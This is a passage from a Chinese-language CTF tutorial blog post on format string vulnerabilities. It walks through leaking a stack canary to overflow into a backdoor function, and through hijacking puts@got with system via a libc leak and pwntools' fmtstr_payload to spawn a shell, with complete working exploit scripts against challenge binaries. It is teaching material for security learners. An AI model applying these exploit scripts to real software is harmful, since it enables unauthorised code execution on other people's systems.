<p>进IDA看一下main函数开头和结尾的汇编<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130000.png" alt="Pasted image 20250212130000"><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130035.png" alt="Pasted image 20250212130035"><br>以上证实了程序开启了Canary保护<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130133.png" alt="Pasted image 20250212130133"><br>再看一下伪代码<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130229.png" alt="Pasted image 20250212130229"><br>发现了printf(格式化字符串漏洞)和易导致栈溢出的函数gets<br>同时发现后门<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130214.png" alt="Pasted image 20250212130214"><br>大致解题思路如下：<strong>覆盖至main函数的Cananry处，填上正确的Canary，然后覆盖返回地址为后门函数处，即可拿到shell</strong><br>根据汇编可知寄存器edx里存的就是Canary的值<br>我们在printf和main函数末尾的xor下断点</p>
<p><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132656.png" alt="Pasted image 20250212132656"><br>0xffffc620为format在stack中的位置<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132542.png" alt="Pasted image 20250212132542"><br>EDX的值就是Canary的值<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132749.png" alt="Pasted image 20250212132749"><br>看内存，Canary的值与format相距15<br>Canary的偏移为15，这样我们在第一次gets时发送<code>%15$x</code>就会（printf)泄露出canary<br>的值</p>
<blockquote>
<p><code>%s</code>：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
</blockquote>
<p>然后我们确定gets到Canary的偏移<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212133441.png" alt="Pasted image 20250212133441"><br>由前面分析可知v5里就是Canary的值<br>在IDA中查看可知s到v5的偏移为0x2c-0x04=40<br><strong><em>EBP下面为return_address</em></strong><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212134019.png" alt="Pasted image 20250212134019"><br>canary在[ESP+0x3c]=0xffffc65c，EBP在0xffffc668，相减等于12<br>完成如下exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./binary_200&#x27;</span>) </span><br><span class="line">sys = <span class="number">0x0804854d</span></span><br><span class="line">p.sendline(<span class="string">&#x27;%15$x&#x27;</span>)</span><br><span class="line">Canary = <span class="built_in">int</span>(p.recv(),<span class="number">16</span>)   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Canary:&#x27;</span>,<span class="built_in">hex</span>(Canary))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p32(Canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212135349.png" alt="Pasted image 20250212135349"><br>同时可以看出Canary是变化的<br><strong><em>getshell</em></strong></p>
<h3 id="例-3-hijack-GOT"><a href="#例-3-hijack-GOT" class="headerlink" title="例(3) hijack GOT"></a>例(3) hijack GOT</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA">https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA</a><br>提取码：140h</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>现在的C程序中，libc的函数是通过GOT表来实现跳转的。在没有开启RELRO(或开启Partial RELRO）保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。<br>假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤</p>
<ul>
<li>确定函数A的GOT表地址<br>  主要利用函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找</li>
<li>确定函数B的内存地址<br>  需要想办法泄露对应函数B的地址</li>
<li>将函数B的内存写入到函数A的GOT表地址处<br>  需要利用函数的漏洞来触发<pre><code>  写入函数：write函数
  ROP
  - `pop eax; ret; # printf@got -&gt; eax`
  - ` pop ebx; ret; # (addr_offset = system_addr - printf_addr) -&gt; ebx`
  - `add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset`
  格式化字符串任意地址写
</code></pre><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212140021.png" alt="Pasted image 20250212140021"><br>32位，只开启了NX(栈不可执行保护)</li>
</ul>
</blockquote>
<h5 id="查看文件执行流程"><a href="#查看文件执行流程" class="headerlink" title="查看文件执行流程"></a>查看文件执行流程</h5><p><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164428.png" alt="Pasted image 20250212164428"><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164533.png" alt="Pasted image 20250212164533"><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164645.png" alt="Pasted image 20250212164645"><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164657.png" alt="Pasted image 20250212164657"><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164940.png" alt="Pasted image 20250212164940"><br>自己运行一下这个程序了解该程序的功能，总的来说该程序模拟了一个文件创建读取软件</p>
<h5 id="getshell思路"><a href="#getshell思路" class="headerlink" title="getshell思路"></a>getshell思路</h5><p>无现成的system和bin/sh，尝试泄露libc<br>同时，除了一个格式化字符串漏洞之外，其他地方没有什么问题<br>我们尝试用printf函数来泄露函数的真实地址<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212170014.png" alt="Pasted image 20250212170014"></p>
<h6 id="确定格式化字符串偏移"><a href="#确定格式化字符串偏移" class="headerlink" title="确定格式化字符串偏移"></a>确定格式化字符串偏移</h6><p>简单逆向分析处密码<code>rxraclhm</code><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212171550.png" alt="Pasted image 20250212171550"><br>从栈上或输出均可判断输入的字符串偏移为7</p>
<h6 id="泄露puts函数地址"><a href="#泄露puts函数地址" class="headerlink" title="泄露puts函数地址"></a>泄露puts函数地址</h6><p>已知字符串偏移为7，然后利用pwntools的ELF模块可知puts@got的地址，构建如下payload<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
</blockquote>
<p>我们将%s放在第7位，puts@got放在第8位，这样%8$s就会把puts函数的真实地址打印出来了。为什么要这样布置呢，其实是为了方便接收打印出来的字符串。<strong>这样布置后puts函数的真实地址会在前4个字节打出来，所以只需要接收前四个就可以了</strong>。</p>
<blockquote>
<p>当然你也可以选择：payload=p32(puts_got) +’%7$s’<br>这种方式，不过打印出来的内容需要从<strong>第5个字节开始接收</strong></p>
</blockquote>
<p>这样即可得到程序运行时puts函数的真实地址<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></p>
<h6 id="找system函数地址"><a href="#找system函数地址" class="headerlink" title="找system函数地址"></a>找system函数地址</h6><p>如果是远程pwn，我们去查找一下libc对应版本即可<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212172938.png" alt="Pasted image 20250212172938"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.address=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h6 id="覆盖puts函数"><a href="#覆盖puts函数" class="headerlink" title="覆盖puts函数"></a>覆盖puts函数</h6><p>前面已经用过了puts_file和get_file函数，接下来使用show_dir函数<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212173601.png" alt="Pasted image 20250212173601"><br>基本思路是这样的：<br>回顾一下show_dir函数，这个函数会将我们输入的文件名存放在变量s中，最后会作为puts函数的参数打印出来。<strong>那么如果将puts函数替换成system函数，并且我们创建一个叫”/bin/sh”的文件名，那么原本应该执行的是puts(s)，但实际上执行的却是system(“/bin/sh”)</strong><br>那么覆盖的过程依然利用格式化字符串进行覆盖，这里介绍一下pwntools中的一个函数<br><code>fmtstr_payload</code><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212181148.png" alt="Pasted image 20250212181148"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;puts_got:sys_addr&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>7:距离格式化字符串的偏移<br>puts_got:被覆盖的地址<br>sys_addr:覆盖的地址</p>
</blockquote>
<h6 id="执行dir后getshell"><a href="#执行dir后getshell" class="headerlink" title="执行dir后getshell"></a>执行dir后getshell</h6><p>覆盖后输入dir调用show_dir函数，原本的puts(“/bin/sh;”)就会转而执行system(“/bin/sh;”),然后即可getshell</p>
<h5 id="回顾思路"><a href="#回顾思路" class="headerlink" title="回顾思路"></a>回顾思路</h5><p>输入密码—&gt;输入put创建文件—&gt;输入文件名”/bin/sh;”—&gt;输入文件内容（覆盖的payload)-&gt;输入get打印文件内容—&gt;输入要打印的文件名”/bin/sh;“执行覆盖</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>   </span><br><span class="line">sh=process(<span class="string">&#x27;./pwn3&#x27;</span>)    </span><br><span class="line">pwn3=ELF(<span class="string">&#x27;./pwn3&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#登录密码</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;nism):&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;rxraclhm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=pwn3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;upload:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Zechariah&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of puts</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Zechariah&#x27;</span>)</span><br><span class="line">put_addr= u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_got-&gt;system</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">7</span>,&#123;puts_got:sys_addr&#125;)</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;upload:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#在运行show_dir时将puts变为system</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get执行printf，令payload执行成功</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过dir开shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p><strong><em>getshell</em></strong><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212204303.png" alt="Pasted image 20250212204303"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zechariah-0703.github.io">Zechariah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zechariah-0703.github.io/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">https://zechariah-0703.github.io/2025/02/12/PWN入门-格式化字符串/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zechariah-0703.github.io" target="_blank">Zechariahの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">格式化字符串漏洞</a></div><div class="post-share"><div class="social-share" data-image="/img/fengmian.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/" title="C语言函数原型整理"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">C语言函数原型整理</div></div><div class="info-2"><div class="info-item-1">system当system函数执行的时候会利用到rdi里的参数 writewrite（1，write_got，8）是把write_got地址指向内存的内容的前8个字节写入到标准输出流中。ssize_t write(int fd, const void *buf, size_t count)参数说明:‌fd‌:文件描述符，表示要写入数据的文件或设备。文件描述符是一个整数，通常是由open系统调用返回的。例如，0表示标准输入（stdin），1表示标准输出（stdout），2表示标准错误（stderr）。‌buf‌:指向要写入数据的缓冲区的指针。这个指针可以是任何类型的数据，因为它是void类型的。count‌:要写入的字节数。函数会尝试从buf中写入count个字节的数据。‌返回值:正整数:表示成功写入的字节数，可能会小于count（例如，由于磁盘已满等原因）。0‌:表示没有写入任何数据。-1‌‌:表示发生错误，并设置`errno`来提供进一步的错误信息。 readssize_t read(int fd,void*buf,size_t count)参数说明：fd:是文件描述符buf:...</div></div></div></a><a class="pagination-related" href="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/" title="PWN入门-基本ROP"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PWN入门-基本ROP</div></div><div class="info-2"><div class="info-item-1">基本ROP前言在了解栈溢出后，我们再从原理和方法两方面深入理解基本ROP 什么是ROPROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章栈溢出漏洞原理详解与利用，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。 为什么要ROP探究原因之前，我们先看一下什么是NX(DEP)，NX即No-execute(不可执行)的意思，NX(DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种。 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/" title="AWD学习"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-16</div><div class="info-item-2">AWD学习</div></div><div class="info-2"><div class="info-item-1">AWD流程 改init_hosts.py中的ip格式和port 改submit_flag.py中的提交方式和token 改round_wait_time patch 写exp 批量攻击  扫描IPimport requestsimport threading li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;) def check_ip(i):    try:        url = f&#x27;http://192-168-1-&#123;i&#125;.awd.bugku.cn/&#x27; #*        response = requests.get(url, timeout=0.5)        if response.status_code == 200:            li(&#x27;[+] &...</div></div></div></a><a class="pagination-related" href="/2025/02/22/Art-of-shellcode/" title="Art_of_shellcode"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-22</div><div class="info-item-2">Art_of_shellcode</div></div><div class="info-2"><div class="info-item-1">很有用的网址https://www.exploit-db.com/shellcodes https://v3rdant.cn/Pwn.The-Art-of-Shellcode/ PWN:手动编写 x64 基于syscall 的 shell code(TODO)_x64 syscall pwn-CSDN博客 </div></div></div></a><a class="pagination-related" href="/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/" title="C语言函数原型整理"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-14</div><div class="info-item-2">C语言函数原型整理</div></div><div class="info-2"><div class="info-item-1">system当system函数执行的时候会利用到rdi里的参数 writewrite（1，write_got，8）是把write_got地址指向内存的内容的前8个字节写入到标准输出流中。ssize_t write(int fd, const void *buf, size_t count)参数说明:‌fd‌:文件描述符，表示要写入数据的文件或设备。文件描述符是一个整数，通常是由open系统调用返回的。例如，0表示标准输入（stdin），1表示标准输出（stdout），2表示标准错误（stderr）。‌buf‌:指向要写入数据的缓冲区的指针。这个指针可以是任何类型的数据，因为它是void类型的。count‌:要写入的字节数。函数会尝试从buf中写入count个字节的数据。‌返回值:正整数:表示成功写入的字节数，可能会小于count（例如，由于磁盘已满等原因）。0‌:表示没有写入任何数据。-1‌‌:表示发生错误，并设置`errno`来提供进一步的错误信息。 readssize_t read(int fd,void*buf,size_t count)参数说明：fd:是文件描述符buf:...</div></div></div></a><a class="pagination-related" href="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="ELF文件保护机制"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-06</div><div class="info-item-2">ELF文件保护机制</div></div><div class="info-2"><div class="info-item-1">Linux ELF文件的保护主要有四种：Canary、NX、PIE、RELRO 1.CanaryStackCanary表示栈的报警保护。在函数返回值之前添加的一串随机数（不超过机器字长）（也叫做cookie），末位为/x00（提供了覆盖最后一字节输出泄露Canary的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到Canary处，就会改变原本该处的数值，当程序执行到此处时，会检查Canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。 //GCC用法gcc -o test test.c // 默认情况下，不开启Canary保护gcc -fno-stack-protector -o test test.c //禁用栈保护gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码-fno-stack-protector /-fstack-prote...</div></div></div></a><a class="pagination-related" href="/2025/04/08/NPC_final_crypwnto/" title="NPC_final出题小记（通过fmt进行RSA-CRT Fault Injection）"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-08</div><div class="info-item-2">NPC_final出题小记（通过fmt进行RSA-CRT Fault Injection）</div></div><div class="info-2"><div class="info-item-1">前言 本题源码改自于2022 Samsung的SecureRunner  本题是一道二进制分析和密码学相结合的题，笔者认为出这种题还是很有趣的。  本题暂已托管至西安电子科技大学CTF终端供大家练习复现 链接：NPC²CTF 2025 - 西电 CTF 终端 其余用途均需通过 关于笔者 中的邮箱征得笔者同意  题目编写源码源码会开源到我的github仓库 解题步骤题目描述小睦的大脑里只有签名正确的命令才能执行，可小睦睡着了，Mortis 太 fw 了不知道私钥。 看来只能和 Mortis 把脑内小剧场破坏的乱七八糟才能拿 flag 了 （简单 Crypto + 签到 PWN = 也许还行的大粪 CRYpwnTO）（需要一点基础的二进制分析能力）  为了降低难度，把这题的密码考点（RSA-CRT Fault Injection）单独编了一个题（即task.zip中的just_a_hint.py）作为提示  靶机连接 连上靶机后忽略没什么用的剧情，结合文字信息和对各种选项的尝试，可以提炼出以下要点  选项1可以获取RSA公钥 选项2可以执行命令，但同时需要输入命令和这条命令正确的si...</div></div></div></a><a class="pagination-related" href="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/" title="PWN入门-基本ROP"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-11</div><div class="info-item-2">PWN入门-基本ROP</div></div><div class="info-2"><div class="info-item-1">基本ROP前言在了解栈溢出后，我们再从原理和方法两方面深入理解基本ROP 什么是ROPROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章栈溢出漏洞原理详解与利用，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。 为什么要ROP探究原因之前，我们先看一下什么是NX(DEP)，NX即No-execute(不可执行)的意思，NX(DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种。 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Zechariah</div><div class="author-info-description">⭐晚安の魔法🪄-🎠睦缇丝🎡</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Zechariah-0703"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">晚安，网友</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span 